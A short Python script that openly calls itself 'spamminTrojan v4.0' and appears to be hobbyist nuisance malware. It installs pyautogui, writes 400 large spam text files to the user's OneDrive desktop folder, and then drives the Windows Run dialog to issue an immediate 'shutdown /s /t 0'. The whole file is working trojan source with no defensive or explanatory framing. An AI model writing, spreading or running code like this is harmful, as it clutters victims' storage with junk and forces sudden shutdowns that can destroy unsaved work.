import os

import time

os.system("pip install pyautogui")
import pyautogui as pip

pip.alert("spamminTrojan v4.0 activated.")
login = os.getlogin()
file = 0
print("spamminTrojan V4.0")

def writing():
    for i in range(10000):
        file.write("attacked by spammingTrojan v4.0 / ")

for i in range(400):
    file = open("C:/Users/" + login + "/OneDrive/Рабочий стол/test"+ str(i) +".txt", "w")
    writing()
    file.close()
print("Attacked successfully.")
time.sleep(2)
pip.hotkey("win", "r")
pip.write("shutdown /s /t 0")
pip.press("enter")
input()